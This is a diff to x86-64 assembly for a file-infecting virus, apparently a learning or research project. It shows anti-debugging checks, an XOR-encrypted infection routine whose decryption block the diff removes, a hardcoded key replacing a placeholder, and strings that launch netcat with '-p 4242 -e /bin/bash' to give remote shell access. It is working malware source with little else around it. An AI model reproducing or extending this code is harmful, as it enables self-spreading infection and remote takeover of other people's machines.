@@ -113,16 +113,20 @@ can_run_infection:
 	call check_process				; _ret = check_process();
 	cmp rax, 1					; if (_ret == 1)
 	je .process					; 	goto .process;
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
 .end_anti_debugging:
 
-.begin_uncipher:
-	lea rdi, [rel infection_routine]		; data = &infection_routine
-	mov rsi, [rel compressed_data_size2]		; size = compressed_data_size2
-	lea rdx, [rel key]				; key = key
-	mov rcx, key_size				; key_size = key_size
-	call xor_cipher					; xor_cipher(data, size, key, key_size)
-	jmp .valid					; goto .valid
-.end_uncipher:
+
 .end_mixed_code:
 
 	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
@@ -499,7 +503,9 @@ nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
-magic_key: db 0x00					; Will be replaced by a script
+magic_key: db 0xf0, 0x8d, 0x3d, 0x5d, 0x04, 0x48, 0x83, 0xb0, 0x8b, 0x49, 0xee, 0xeb, 0x8d, 0x00, 0x48, 0x8d
+db 0x5d, 0x1e, 0xfb, 0x01, 0x74, 0xce, 0x99, 0x90, 0x90, 0x90, 0x78, 0xd8, 0x92, 0x90, 0x90, 0x7b
+db 0xbc
 magic_key_size: equ $ - magic_key
 ; never used but here to be copied in the binary
 clean: db 0x0
